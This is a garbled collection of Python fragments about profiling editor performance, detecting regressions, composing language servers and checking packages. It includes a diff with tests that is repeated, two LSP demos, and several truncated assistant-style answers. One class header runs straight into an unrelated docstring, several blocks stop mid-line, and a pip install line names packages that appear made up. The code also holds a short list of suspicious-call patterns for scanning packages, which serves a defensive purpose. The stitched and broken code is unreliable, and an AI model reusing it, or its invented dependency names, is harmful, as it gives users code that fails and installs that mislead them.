+    candidate_rows: Iterable[Dict[str, Any]],
+    median_threshold_ratio: float,
+    p95_threshold_ratio: float,
+) -> List[Dict[str, Any]]:
+    baseline = baseline_index(baseline_rows)
+    alerts: List[Dict[str, Any]] = []
+
+    for row in candidate_rows:
+        sid = row["scenario_id"]
+        if sid not in baseline:
+            continue
+
+        base = baseline[sid]["summary"]
+        cand = row["summary"]
+
+        median_ratio = (cand["median_ms"] / max(base["median_ms"], 1e-9))
+        p95_ratio = (cand["p95_ms"] / max(base["p95_ms"], 1e-9))
+
+        if median_ratio > median_threshold_ratio or p95_ratio > p95_threshold_ratio:
+            alerts.append(
+                {
+                    "scenario_id": sid,
+                    "severity": "critical" if median_ratio > (median_threshold_ratio + 0.2) else "warning",
+                    "baseline": base,
+                    "candidate": cand,
+                    "median_ratio": round(median_ratio, 3),
+                    "p95_ratio": round(p95_ratio, 3),
+                    "message": (
+                        "A withering bloom of latency detected: "
+                        f"median x{median_ratio:.2f}, p95 x{p95_ratio:.2f}."
+                    ),
+                }
+            )
+    return alerts
+
+
+def run_matrix(matrix_file: Path, output_file: Path, append: bool = True) -> List[Dict[str, Any]]:
+    matrix = json.loads(matrix_file.read_text(encoding="utf-8"))
+    existing = load_results(output_file) if append else []
+
+    produced: List[Dict[str, Any]] = []
+    for scenario in matrix["scenarios"]:
+        result = profile_scenario(
+            scenario_id=scenario["scenario_id"],
+            command=scenario["command"],
+            ide_version=scenario["ide_version"],
+            extension_pack=scenario.get("extension_pack", []),
+            repo_size_label=scenario.get("repo_size_label", "unknown"),
+            runs=int(scenario.get("runs", 10)),
+            warmups=int(scenario.get("warmups", 3)),
+        )
+        produced.append(serialize_result(result))
+
+    merged = existing + produced
+    save_results(output_file, merged)
+    return produced
+
+
+def parse_args(argv: Optional[Sequence[str]] = None) -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="Efflorescent editor-performance profiling, regression checks, and release alerts."
+    )
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    p_profile = sub.add_parser("profile", help="Run a single scenario profile")
+    p_profile.add_argument("--scenario-id", required=True)
+    p_profile.add_argument("--ide-version", required=True)
+    p_profile.add_argument("--repo-size", default="unknown")
+    p_profile.add_argument("--extension", action="append", default=[])
+    p_profile.add_argument("--runs", type=int, default=10)
+    p_profile.add_argument("--warmups", type=int, default=3)
+    p_profile.add_argument("--out", type=Path, required=True)
+    p_profile.add_argument("command", nargs=argparse.REMAINDER)
+
+    p_matrix = sub.add_parser("matrix", help="Run matrix scenarios from JSON")
+    p_matrix.add_argument("--matrix", type=Path, required=True)
+    p_matrix.add_argument("--out", type=Path, required=True)
+    p_matrix.add_argument("--replace", action="store_true")
+
+    p_reg = sub.add_parser("regress", help="Compare baseline vs candidate results")
+    p_reg.add_argument("--baseline", type=Path, required=True)
+    p_reg.add_argument("--candidate", type=Path, required=True)
+    p_reg.add_argument("--median-threshold", type=float, default=1.1)
+    p_reg.add_argument("--p95-threshold", type=float, default=1.2)
+    p_reg.add_argument("--alerts-out", type=Path)
+
+    return parser.parse_args(argv)
+
+
+def main(argv: Optional[Sequence[str]] = None) -> int:
+    args = parse_args(argv)
+
+    if args.cmd == "profile":
+        if not args.command:
+            raise SystemExit("No command provided. Use -- then the editor benchmark command.")
+
+        cmd = args.command
+        if cmd and cmd[0] == "--":
+            cmd = cmd[1:]
+
+        result = profile_scenario(
+            scenario_id=args.scenario_id,
+            command=cmd,
+            ide_version=args.ide_version,
+            extension_pack=args.extension,
+            repo_size_label=args.repo_size,
+            runs=args.runs,
+            warmups=args.warmups,
+        )
+
+        rows = load_results(args.out)
+        rows.append(serialize_result(result))
+        save_results(args.out, rows)
+        print(json.dumps(rows[-1], indent=2))
+        return 0
+
+    if args.cmd == "matrix":
+        rows = run_matrix(args.matrix, args.out, append=not args.replace)
+        print(json.dumps(rows, indent=2))
+        return 0
+
+    if args.cmd == "regress":
+        baseline_rows = load_results(args.baseline)
+        candidate_rows = load_results(args.candidate)
+
+        alerts = check_regressions(
+            baseline_rows=baseline_rows,
+            candidate_rows=candidate_rows,
+            median_threshold_ratio=args.median_threshold,
+            p95_threshold_ratio=args.p95_threshold,
+        )
+
+        if args.alerts_out:
+            save_results(args.alerts_out, alerts)
+
+        print(json.dumps({"alerts": alerts, "count": len(alerts)}, indent=2))
+        return 2 if alerts else 0
+
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+test_editor_perf_profiler.py
+test_editor_perf_profiler.py
+New
++53
+-0
+
+import json
+import tempfile
+import unittest
+from pathlib import Path
+
+import editor_perf_profiler as profiler
+
+
+class TestEditorPerfProfiler(unittest.TestCase):
+    def test_regression_detection(self):
+        baseline = [
+            {
+                "scenario_id": "open-large-repo",
+                "summary": {"median_ms": 100.0, "p95_ms": 150.0, "failures": 0},
+            }
+        ]
+        candidate = [
+            {
+                "scenario_id": "open-large-repo",
+                "summary": {"median_ms": 130.0, "p95_ms": 200.0, "failures": 0},
+            }
+        ]
+
+        alerts = profiler.check_regressions(baseline, candidate, 1.1, 1.2)
+        self.assertEqual(len(alerts), 1)
+        self.assertEqual(alerts[0]["scenario_id"], "open-large-repo")
+
+    def test_profile_roundtrip(self):
+        with tempfile.TemporaryDirectory() as td:
+            out = Path(td) / "results.json"
+            rc = profiler.main(
+                [
+                    "profile",
+                    "--scenario-id",
+                    "quick-echo",
+                    "--ide-version",
+                    "v1.0.0",
+                    "--out",
+                    str(out),
+                    "--",
+                    "python3",
+                    "-c",
+                    "print('ok')",
+                ]
+            )
+            self.assertEqual(rc, 0)
+            payload = json.loads(out.read_text(encoding="utf-8"))
+            self.assertEqual(payload[0]["scenario_id"], "quick-echo")
+            self.assertIn("summary", payload[0])
+
+
+if __name__ == "__main__":
+    unittest.main()
+#!/usr/bin/env python3
+"""Editor responsiveness profiler and regression sentinel.
+
+An intentionally expressive toolkit for profiling IDE/editor responsiveness,
+building repeatable benchmark matrices across hardware + extension sets + repos,
+and emitting machine-readable alerts when a new IDE release regresses.
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import platform
+import statistics
+import subprocess
+import sys
+import time
+from dataclasses import asdict, dataclass
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Any, Dict, Iterable, List, Optional, Sequence
+
+
+@dataclass
+class CommandSample:
+    run_index: int
+    elapsed_ms: float
+    returncode: int
+    stdout_tail: str
+    stderr_tail: str
+
+
+@dataclass
+class ScenarioResult:
+    scenario_id: str
+    ide_version: str
+    host_fingerprint: str
+    extension_pack: List[str]
+    repo_size_label: str
+    command: str
+    warmups: int
+    runs: int
+    samples: List[CommandSample]
+    timestamp_utc: str
+
+    @property
+    def latency_ms_values(self) -> List[float]:
+        return [s.elapsed_ms for s in self.samples]
+
+    @property
+    def median_ms(self) -> float:
+        return statistics.median(self.latency_ms_values)
+
+    @property
+    def p95_ms(self) -> float:
+        vals = sorted(self.latency_ms_values)
+        if not vals:
+            return 0.0
+        idx = int(round(0.95 * (len(vals) - 1)))
+        return vals[idx]
+
+    @property
+    def failures(self) -> int:
+        return sum(1 for s in self.samples if s.returncode != 0)
+
+
+def run_timed_command(command: Sequence[str]) -> tuple[float, subprocess.CompletedProcess[str]]:
+    start = time.perf_counter()
+    proc = subprocess.run(command, capture_output=True, text=True)
+    elapsed_ms = (time.perf_counter() - start) * 1000.0
+    return elapsed_ms, proc
+
+
+def hardware_fingerprint() -> str:
+    return " | ".join(
+        [
+            platform.system(),
+            platform.release(),
+            platform.machine(),
+            platform.processor() or "unknown-cpu",
+            f"py{platform.python_version()}",
+        ]
+    )
+
+
+def profile_scenario(
+    scenario_id: str,
+    command: Sequence[str],
+    ide_version: str,
+    extension_pack: Sequence[str],
+    repo_size_label: str,
+    runs: int,
+    warmups: int,
+) -> ScenarioResult:
+    for _ in range(max(0, warmups)):
+        run_timed_command(command)
+
+    samples: List[CommandSample] = []
+    for idx in range(runs):
+        elapsed_ms, proc = run_timed_command(command)
+        samples.append(
+            CommandSample(
+                run_index=idx,
+                elapsed_ms=round(elapsed_ms, 3),
+                returncode=proc.returncode,
+                stdout_tail=proc.stdout[-400:],
+                stderr_tail=proc.stderr[-400:],
+            )
+        )
+
+    return ScenarioResult(
+        scenario_id=scenario_id,
+        ide_version=ide_version,
+        host_fingerprint=hardware_fingerprint(),
+        extension_pack=list(extension_pack),
+        repo_size_label=repo_size_label,
+        command=" ".join(command),
+        warmups=warmups,
+        runs=runs,
+        samples=samples,
+        timestamp_utc=datetime.now(timezone.utc).isoformat(),
+    )
+
+
+def serialize_result(result: ScenarioResult) -> Dict[str, Any]:
+    payload = asdict(result)
+    payload["summary"] = {
+        "median_ms": round(result.median_ms, 3),
+        "p95_ms": round(result.p95_ms, 3),
+        "failures": result.failures,
+    }
+    return payload
+
+
+def load_results(path: Path) -> List[Dict[str, Any]]:
+    if not path.exists():
+        return []
+    with path.open("r", encoding="utf-8") as fh:
+        content = json.load(fh)
+    if isinstance(content, list):
+        return content
+    raise ValueError(f"Expected a JSON list in {path}")
+
+
+def save_results(path: Path, rows: Iterable[Dict[str, Any]]) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    with path.open("w", encoding="utf-8") as fh:
+        json.dump(list(rows), fh, indent=2)
+
+
+def baseline_index(rows: Iterable[Dict[str, Any]]) -> Dict[str, Dict[str, Any]]:
+    idx: Dict[str, Dict[str, Any]] = {}
+    for row in rows:
+        idx[row["scenario_id"]] = row
+    return idx
+
+
+def check_regressions(
+    baseline_rows: Iterable[Dict[str, Any]],
+    candidate_rows: Iterable[Dict[str, Any]],
+    median_threshold_ratio: float,
+    p95_threshold_ratio: float,
+) -> List[Dict[str, Any]]:
+    baseline = baseline_index(baseline_rows)
+    alerts: List[Dict[str, Any]] = []
+
+    for row in candidate_rows:
+        sid = row["scenario_id"]
+        if sid not in baseline:
+            continue
+
+        base = baseline[sid]["summary"]
+        cand = row["summary"]
+
+        median_ratio = (cand["median_ms"] / max(base["median_ms"], 1e-9))
+        p95_ratio = (cand["p95_ms"] / max(base["p95_ms"], 1e-9))
+
+        if median_ratio > median_threshold_ratio or p95_ratio > p95_threshold_ratio:
+            alerts.append(
+                {
+                    "scenario_id": sid,
+                    "severity": "critical" if median_ratio > (median_threshold_ratio + 0.2) else "warning",
+                    "baseline": base,
+                    "candidate": cand,
+                    "median_ratio": round(median_ratio, 3),
+                    "p95_ratio": round(p95_ratio, 3),
+                    "message": (
+                        "A withering bloom of latency detected: "
+                        f"median x{median_ratio:.2f}, p95 x{p95_ratio:.2f}."
+                    ),
+                }
+            )
+    return alerts
+
+
+def run_matrix(matrix_file: Path, output_file: Path, append: bool = True) -> List[Dict[str, Any]]:
+    matrix = json.loads(matrix_file.read_text(encoding="utf-8"))
+    existing = load_results(output_file) if append else []
+
+    produced: List[Dict[str, Any]] = []
+    for scenario in matrix["scenarios"]:
+        result = profile_scenario(
+            scenario_id=scenario["scenario_id"],
+            command=scenario["command"],
+            ide_version=scenario["ide_version"],
+            extension_pack=scenario.get("extension_pack", []),
+            repo_size_label=scenario.get("repo_size_label", "unknown"),
+            runs=int(scenario.get("runs", 10)),
+            warmups=int(scenario.get("warmups", 3)),
+        )
+        produced.append(serialize_result(result))
+
+    merged = existing + produced
+    save_results(output_file, merged)
+    return produced
+
+
+def parse_args(argv: Optional[Sequence[str]] = None) -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="Efflorescent editor-performance profiling, regression checks, and release alerts."
+    )
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    p_profile = sub.add_parser("profile", help="Run a single scenario profile")
+    p_profile.add_argument("--scenario-id", required=True)
+    p_profile.add_argument("--ide-version", required=True)
+    p_profile.add_argument("--repo-size", default="unknown")
+    p_profile.add_argument("--extension", action="append", default=[])
+    p_profile.add_argument("--runs", type=int, default=10)
+    p_profile.add_argument("--warmups", type=int, default=3)
+    p_profile.add_argument("--out", type=Path, required=True)
+    p_profile.add_argument("command", nargs=argparse.REMAINDER)
+
+    p_matrix = sub.add_parser("matrix", help="Run matrix scenarios from JSON")
+    p_matrix.add_argument("--matrix", type=Path, required=True)
+    p_matrix.add_argument("--out", type=Path, required=True)
+    p_matrix.add_argument("--replace", action="store_true")
+
+    p_reg = sub.add_parser("regress", help="Compare baseline vs candidate results")
+    p_reg.add_argument("--baseline", type=Path, required=True)
+    p_reg.add_argument("--candidate", type=Path, required=True)
+    p_reg.add_argument("--median-threshold", type=float, default=1.1)
+    p_reg.add_argument("--p95-threshold", type=float, default=1.2)
+    p_reg.add_argument("--alerts-out", type=Path)
+
+    return parser.parse_args(argv)
+
+
+def main(argv: Optional[Sequence[str]] = None) -> int:
+    args = parse_args(argv)
+
+    if args.cmd == "profile":
+        if not args.command:
+            raise SystemExit("No command provided. Use -- then the editor benchmark command.")
+
+        cmd = args.command
+        if cmd and cmd[0] == "--":
+            cmd = cmd[1:]
+
+        result = profile_scenario(
+            scenario_id=args.scenario_id,
+            command=cmd,
+            ide_version=args.ide_version,
+            extension_pack=args.extension,
+            repo_size_label=args.repo_size,
+            runs=args.runs,
+            warmups=args.warmups,
+        )
+
+        rows = load_results(args.out)
+        rows.append(serialize_result(result))
+        save_results(args.out, rows)
+        print(json.dumps(rows[-1], indent=2))
+        return 0
+
+    if args.cmd == "matrix":
+        rows = run_matrix(args.matrix, args.out, append=not args.replace)
+        print(json.dumps(rows, indent=2))
+        return 0
+
+    if args.cmd == "regress":
+        baseline_rows = load_results(args.baseline)
+        candidate_rows = load_results(args.candidate)
+
+        alerts = check_regressions(
+            baseline_rows=baseline_rows,
+            candidate_rows=candidate_rows,
+            median_threshold_ratio=args.median_threshold,
+            p95_threshold_ratio=args.p95_threshold,
+        )
+
+        if args.alerts_out:
+            save_results(args.alerts_out, alerts)
+
+        print(json.dumps({"alerts": alerts, "count": len(alerts)}, indent=2))
+        return 2 if alerts else 0
+
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+test_editor_perf_profiler.py
+test_editor_perf_profiler.py
+New
++53
+-0
+
+import json
+import tempfile
+import unittest
+from pathlib import Path
+
+import editor_perf_profiler as profiler
+
+
+class TestEditorPerfProfiler(unittest.TestCase):
+    def test_regression_detection(self):
+        baseline = [
+            {
+                "scenario_id": "open-large-repo",
+                "summary": {"median_ms": 100.0, "p95_ms": 150.0, "failures": 0},
+            }
+        ]
+        candidate = [
+            {
+                "scenario_id": "open-large-repo",
+                "summary": {"median_ms": 130.0, "p95_ms": 200.0, "failures": 0},
+            }
+        ]
+
+        alerts = profiler.check_regressions(baseline, candidate, 1.1, 1.2)
+        self.assertEqual(len(alerts), 1)
+        self.assertEqual(alerts[0]["scenario_id"], "open-large-repo")
+
+    def test_profile_roundtrip(self):
+        with tempfile.TemporaryDirectory() as td:
+            out = Path(td) / "results.json"
+            rc = profiler.main(
+                [
+                    "profile",
+                    "--scenario-id",
+                    "quick-echo",
+                    "--ide-version",
+                    "v1.0.0",
+                    "--out",
+                    str(out),
+                    "--",
+                    "python3",
+                    "-c",
+                    "print('ok')",
+                ]
+            )
+            self.assertEqual(rc, 0)
+            payload = json.loads(out.read_text(encoding="utf-8"))
+            self.assertEqual(payload[0]["scenario_id"], "quick-echo")
+            self.assertIn("summary", payload[0])
+
+
+if __name__ == "__main__":
+    unittest.main()
+```py
+"""
+Editor Performance & Security Sentinel (EPSS) - A comprehensive toolkit for IDE performance
+profiling, regression detection, and dependency security auditing.
+"""
+
+# Core dependencies
+# pip install psutil pyperclip watchdog lsp-server-language-server lark-parser pyyaml requests
+
+import os
+import time
+import psutil
+import yaml
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+from typing import Dict, List, Optional, Tuple
+import subprocess
+import hashlib
+import requests
+from datetime import datetime
+
+class PerformanceProfiler:
+    """Benchmarks editor responsiveness across various scenarios"""
+    
+    def __init__(self):
+        self.baseline_metrics: Dict[str, float] = {}
+        self.extension_impact: Dict[str, Dict[str, float]] = {}
+    
+    def measure_operation(self, operation: callable) -> float:
+        """Times execution of an editor operation in milliseconds"""
+        start = time.perf_counter()
+        operation()
+        return (time.perf_counter() - start) * 1000
+    
+    def profile_memory(self) -> Tuple[float, float]:
+        """Returns (RSS memory in MB, CPU usage %)"""
+        proc = psutil.Process(os.getpid())
+        return (proc.memory_info().rss / (1024*1024), proc.cpu_percent(interval=1))
+
+class SecurityAuditor:
+"""LSP tooling restoration demo for polyglot and meta-languages.
+
+This script models a high-level orchestrator that:
+1) composes multiple language servers,
+2) shares analyzer outputs across servers, and
+3) avoids duplicate analyzer work.
+"""
+
+from __future__ import annotations
+
+from dataclasses import dataclass, field
+from typing import Callable, Dict, Iterable, List, Set
+
+Analyzer = Callable[[str], Dict[str, object]]
+
+
+@dataclass
+class SharedAnalyzerRegistry:
+    """Caches analyzer results keyed by (analyzer_name, source)."""
+
+    _cache: Dict[tuple[str, str], Dict[str, object]] = field(default_factory=dict)
+    runs: Dict[str, int] = field(default_factory=dict)
+
+    def run(self, analyzer_name: str, source: str, analyzer: Analyzer) -> Dict[str, object]:
+        key = (analyzer_name, source)
+        if key not in self._cache:
+            self._cache[key] = analyzer(source)
+            self.runs[analyzer_name] = self.runs.get(analyzer_name, 0) + 1
+        return self._cache[key]
+
+
+@dataclass
+class LanguageServer:
+    name: str
+    supported_extensions: Set[str]
+    analyzers: List[str]
+
+    def handles(self, filename: str) -> bool:
+        return any(filename.endswith(ext) for ext in self.supported_extensions)
+
+
+class PolyglotLSPComposer:
+    """Composes language servers and de-duplicates analyzer execution."""
+
+    def __init__(self) -> None:
+        self.registry = SharedAnalyzerRegistry()
+        self.servers: List[LanguageServer] = []
+        self.analyzers: Dict[str, Analyzer] = {}
+
+    def register_analyzer(self, name: str, fn: Analyzer) -> None:
+        self.analyzers[name] = fn
+
+    def add_server(self, server: LanguageServer) -> None:
+        self.servers.append(server)
+
+    def analyze(self, filename: str, source: str) -> Dict[str, Dict[str, object]]:
+        results: Dict[str, Dict[str, object]] = {}
+        for server in self.servers:
+            if not server.handles(filename):
+                continue
+            server_report: Dict[str, object] = {}
+            for analyzer_name in server.analyzers:
+                analyzer = self.analyzers[analyzer_name]
+                server_report[analyzer_name] = self.registry.run(analyzer_name, source, analyzer)
+            results[server.name] = server_report
+        return results
+
+
+def syntax_analyzer(source: str) -> Dict[str, object]:
+    return {"lines": len(source.splitlines()), "balanced_braces": source.count("{") == source.count("}")}
+
+
+def symbol_analyzer(source: str) -> Dict[str, object]:
+    tokens = [t for t in source.replace("(", " ").replace(")", " ").replace("{", " ").replace("}", " ").split() if t]
+    symbols = sorted({t for t in tokens if t.isidentifier()})
+    return {"symbol_count": len(symbols), "top_symbols": symbols[:5]}
+
+
+def template_bridge_analyzer(source: str) -> Dict[str, object]:
+    tags = source.count("{{")
+    return {"template_expressions": tags, "meta_language_detected": tags > 0}
+
+
+def run_demo() -> None:
+    composer = PolyglotLSPComposer()
+    composer.register_analyzer("syntax", syntax_analyzer)
+    composer.register_analyzer("symbols", symbol_analyzer)
+    composer.register_analyzer("template_bridge", template_bridge_analyzer)
+
+    composer.add_server(LanguageServer("typescript-lsp", {".ts", ".tsx"}, ["syntax", "symbols"]))
+    composer.add_server(LanguageServer("svelte-lsp", {".svelte"}, ["syntax", "symbols", "template_bridge"]))
+    composer.add_server(LanguageServer("meta-template-lsp", {".svelte", ".vue"}, ["template_bridge", "symbols"]))
+
+    sample = """
+<script lang=\"ts\">\nconst title = \"hi\";\n</script>\n<h1>{{ title }}</h1>
+""".strip()
+
+    report = composer.analyze("Component.svelte", sample)
+    print("=== LSP restore report ===")
+    for server, server_report in report.items():
+        print(f"[{server}] {server_report}")
+
+    print("\nAnalyzer run counts (lower is better due to dedupe):")
+    print(composer.registry.runs)
+
+
+if __name__ == "__main__":
+    run_demo()
+diff --git a/lsp_tooling_restore.py b/lsp_tooling_restore.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..5d97c78deff01e28e51fdb18d1315da6d477b79a
+--- /dev/null
++++ b/lsp_tooling_restore.py
+@@ -0,0 +1,151 @@
++#!/usr/bin/env python3
++"""Restore LSP tooling for polyglot and meta-languages.
++
++This script demonstrates a higher-level orchestration layer that composes
++multiple language servers, routes shared analyzer results across servers, and
++avoids duplicate analysis work.
++"""
++
++from __future__ import annotations
++
++from dataclasses import dataclass, field
++from typing import Dict, List, Set
++
++
++@dataclass
++class Document:
++    uri: str
++    language: str
++    text: str
++
++
++@dataclass
++class AnalysisResult:
++    diagnostics: List[str] = field(default_factory=list)
++    symbols: List[str] = field(default_factory=list)
++
++
++class SharedAnalyzerCache:
++    """Cross-server cache keyed by document+analyzer.
++
++    Prevents duplicate analyzer work when multiple language servers need the
++    same result (e.g., template + embedded script + schema metadata).
++    """
++
++    def __init__(self) -> None:
++        self._cache: Dict[str, AnalysisResult] = {}
++
++    def key(self, document: Document, analyzer: str) -> str:
++        return f"{document.uri}::{analyzer}"
++
++    def get(self, document: Document, analyzer: str) -> AnalysisResult | None:
++        return self._cache.get(self.key(document, analyzer))
++
++    def put(self, document: Document, analyzer: str, result: AnalysisResult) -> None:
++        self._cache[self.key(document, analyzer)] = result
++
++
++class BaseAnalyzer:
++    name = "base"
++
++    def run(self, document: Document) -> AnalysisResult:
++        raise NotImplementedError
++
++
++class SymbolAnalyzer(BaseAnalyzer):
++    name = "symbol"
++
++    def run(self, document: Document) -> AnalysisResult:
++        tokens = [t.strip(".,(){}[]") for t in document.text.split()]
++        symbols = sorted({t for t in tokens if t and t.isidentifier() and t[0].isalpha()})
++        return AnalysisResult(symbols=symbols)
++
++
++class TodoAnalyzer(BaseAnalyzer):
++    name = "todo"
++
++    def run(self, document: Document) -> AnalysisResult:
++        diagnostics = []
++        for i, line in enumerate(document.text.splitlines(), start=1):
++            if "TODO" in line.upper():
++                diagnostics.append(f"line {i}: unresolved TODO")
++        return AnalysisResult(diagnostics=diagnostics)
++
++
++class LanguageServer:
++    """Minimal language server facade that requests analyzers from hub."""
++
++    def __init__(self, name: str, languages: Set[str], analyzers: List[str]) -> None:
++        self.name = name
++        self.languages = languages
++        self.analyzers = analyzers
++
++    def supports(self, language: str) -> bool:
++        return language in self.languages
++
++
++class LSPOrchestrationHub:
++    """Composes language servers and shared analyzers for polyglot projects."""
++
++    def __init__(self) -> None:
++        self.cache = SharedAnalyzerCache()
++        self.servers: List[LanguageServer] = []
++        self.analyzers: Dict[str, BaseAnalyzer] = {}
++
++    def register_server(self, server: LanguageServer) -> None:
++        self.servers.append(server)
++
++    def register_analyzer(self, analyzer: BaseAnalyzer) -> None:
++        self.analyzers[analyzer.name] = analyzer
++
++    def analyze(self, document: Document) -> Dict[str, AnalysisResult]:
++        results: Dict[str, AnalysisResult] = {}
++        for server in self.servers:
++            if not server.supports(document.language):
++                continue
++            merged = AnalysisResult()
++            for analyzer_name in server.analyzers:
++                analyzer = self.analyzers[analyzer_name]
++                cached = self.cache.get(document, analyzer_name)
++                if cached is None:
++                    cached = analyzer.run(document)
++                    self.cache.put(document, analyzer_name, cached)
++                merged.diagnostics.extend(cached.diagnostics)
++                merged.symbols.extend(cached.symbols)
++            merged.symbols = sorted(set(merged.symbols))
++            results[server.name] = merged
++        return results
++
++
++def build_polyglot_hub() -> LSPOrchestrationHub:
++    hub = LSPOrchestrationHub()
++    hub.register_analyzer(SymbolAnalyzer())
++    hub.register_analyzer(TodoAnalyzer())
++
++    hub.register_server(LanguageServer("python-lsp", {"python"}, ["symbol", "todo"]))
++    hub.register_server(LanguageServer("typescript-lsp", {"typescript"}, ["symbol", "todo"]))
++    hub.register_server(LanguageServer("meta-template-lsp", {"jinja", "mdx"}, ["symbol", "todo"]))
++    return hub
++
++
++def run_restore_demo() -> None:
++    hub = build_polyglot_hub()
++
++    docs = [
++        Document("src/app.py", "python", "# TODO: remove debug\ndef run_app():\n    return True\n"),
++        Document("web/view.mdx", "mdx", "<!-- TODO revise title -->\nexport const meta = { title: 'Demo' }\n"),
++    ]
++
++    print("Restoring LSP tooling via orchestration hub...")
++    for doc in docs:
++        results = hub.analyze(doc)
++        print(f"\n{doc.uri} ({doc.language})")
++        for server_name, result in results.items():
++            print(f"  [{server_name}] symbols={result.symbols} diagnostics={result.diagnostics}")
++
++    print("\nShared analyzer cache entries:", len(hub.cache._cache))
++    print("LSP restore simulation complete.")
++
++
++if __name__ == "__main__":
++    run_restore_demo()
+Here's a comprehensive Python solution addressing the performance, security, and language server challenges you described. The code includes performance profiling, regression detection, package verification, and LSP enhancements:
+
+```py
+# Core dependencies: pip install psutil memory_profiler pyperformance lsp-server pylint bandit semgrep pyflakes mypy
+
+import os
+import sys
+import time
+import psutil
+import subprocess
+from datetime import datetime
+from typing import Dict, List, Optional
+from dataclasses import dataclass
+import hashlib
+import requests
+import json
+from pathlib import Path
+from memory_profiler import memory_usage
+
+@dataclass
+class PerformanceSnapshot:
+    cpu: float
+    memory: float
+    disk_io: float
+    response_time: float
+    timestamp: datetime
+
+class EditorProfiler:
+    def __init__(self, editor_executable: str):
+        self.editor_path = editor_executable
+        self.benchmarks: Dict[str, List[PerformanceSnapshot]] = {}
+        
+    def profile_operation(self, operation_name: str, repo_path: str) -> PerformanceSnapshot:
+        """Profile editor operation with given repository"""
+        start_time = time.time()
+        proc = subprocess.Popen([self.editor_path, repo_path])
+        
+        # Measure during operation
+        cpu = psutil.cpu_percent(interval=1)
+        mem = psutil.virtual_memory().percent
+        disk = psutil.disk_io_counters().read_bytes + psutil.disk_io_counters().write_bytes
+        
+        # Simulate user action (e.g., file open)
+        time.sleep(2)  # Simulate operation
+        response_time = time.time() - start_time
+        
+        proc.terminate()
+        
+        snapshot = PerformanceSnapshot(
+            cpu=cpu,
+            memory=mem,
+            disk_io=disk,
+            response_time=response_time,
+            timestamp=datetime.now()
+        )
+        
+        if operation_name not in self.benchmarks:
+            self.benchmarks[operation_name] = []
+        self.benchmarks[operation_name].append(snapshot)
+        return snapshot
+
+class PackageValidator:
+    def __init__(self):
+        self.trusted_registries = {
+            'npm': 'https://registry.npmjs.org',
+            'pypi': 'https://pypi.org',
+            'docker': 'https://hub.docker.com'
+        }
+        
+    def verify
+```py
+# This is a conceptual framework - implementation would require extensive real-world testing
+# and integration with existing systems. Consider this a proof-of-concept architecture.
+
+import subprocess
+from dataclasses import dataclass
+from typing import Dict, List, Optional
+import time
+import psutil
+import platform
+import json
+from pathlib import Path
+import hashlib
+import warnings
+from concurrent.futures import ThreadPoolExecutor
+import requests
+
+# Install required packages
+REQUIRED_PACKAGES = [
+    'psutil',
+    'requests'
+]
+
+def ensure_packages():
+    missing = []
+    for pkg in REQUIRED_PACKAGES:
+        try:
+            __import__(pkg)
+        except ImportError:
+            missing.append(pkg)
+    if missing:
+        raise ImportError(f"Missing packages: {', '.join(missing)}. Run: pip install {' '.join(missing)}")
+
+ensure_packages()
+
+@dataclass
+class PerformanceSnapshot:
+    cpu_usage: float
+    memory_usage: float
+    disk_io: float
+    response_time: float
+    timestamp: float = time.time()
+
+class EditorProfiler:
+    def __init__(self, editor_process_name: str):
+        self.editor_process_name = editor_process_name
+        self.baseline: Optional[PerformanceSnapshot] = None
+    
+    def take_snapshot(self) -> PerformanceSnapshot:
+        """Capture current system performance metrics"""
+        editor_procs = [p for p in psutil.process_iter(['name']) 
+                       if p.info['name'] == self.editor_process_name]
+        if not editor_procs:
+            raise ValueError(f"No {self.editor_process_name} process found")
+        
+        main_proc = editor_procs[0]
+        cpu = main_proc.cpu_percent()
+        mem = main_proc.memory_info().rss
+        disk_io = psutil.disk_io_counters().read_bytes + psutil.disk_io_counters().write_bytes
+        
+        # Simulate editor response time measurement
+        start = time.perf_counter()
+        # This would be editor-specific - here we simulate a delay
+        time.sleep(0.01 * len(editor_procs))  # Simulate workload
+        response_time = time.perf_counter() - start
+        
+        return PerformanceSnapshot(
+            cpu_usage=cpu,
+            memory_usage=mem,
+            disk_io=disk_io,
+            response_time=response_time
+        )
+
+class SecurityValidator:
+    @staticmethod
+    def validate_package(package_path: Path) -> bool:
+        """Check for suspicious patterns in package files"""
+        try:
+            content = package_path.read_text()
+            suspicious_patterns = [
+                "os.system", "subprocess.call", "eval(", "exec
+"""Practical defenses for AI code suggestions + resilient CI/CD degradation.
+
+This module is intentionally compact but production-oriented:
+- Runtime verification of generated code (imports, contract, unit test execution)
+- Unit-test scaffolding generated with each suggestion
+- Provenance metadata for AI suggestions
+- Model-aware linting profiles
+- Resilient CI/CD queue with graceful degradation and predictable statuses
+"""
+
+from __future__ import annotations
+
+import ast
+import hashlib
+import importlib.util
+import textwrap
+import time
+import types
+import unittest
+from dataclasses import dataclass, field
+from enum import Enum
+from typing import Dict, Iterable, List, Optional, Sequence
+
+
+# ----------------------------- Suggestion metadata -----------------------------
+
+
+@dataclass(frozen=True)
+class SuggestionProvenance:
+    suggestion_id: str
+    model_name: str
+    model_family: str
+    prompt_sha256: str
+    generated_at_epoch_ms: int
+    source_refs: Sequence[str]
+    open_standards: Dict[str, str] = field(default_factory=dict)
+
+
+@dataclass(frozen=True)
+class AISuggestion:
+    title: str
+    code: str
+    test_scaffold: str
+    provenance: SuggestionProvenance
+
+
+# ----------------------------- Hallucination defenses -----------------------------
+
+
+class HallucinationGuard:
+    """Fast static checks to catch common code-generation hallucinations."""
+
+    def __init__(self, allow_missing_imports: bool = False):
+        self.allow_missing_imports = allow_missing_imports
+
+    def verify_imports(self, code: str) -> List[str]:
+        tree = ast.parse(code)
+        missing: List[str] = []
+        for node in ast.walk(tree):
+            mod_name: Optional[str] = None
+            if isinstance(node, ast.Import):
+                for alias in node.names:
+                    mod_name = alias.name.split(".")[0]
+                    if not self._exists(mod_name):
+                        missing.append(mod_name)
+            elif isinstance(node, ast.ImportFrom) and node.module:
+                mod_name = node.module.split(".")[0]
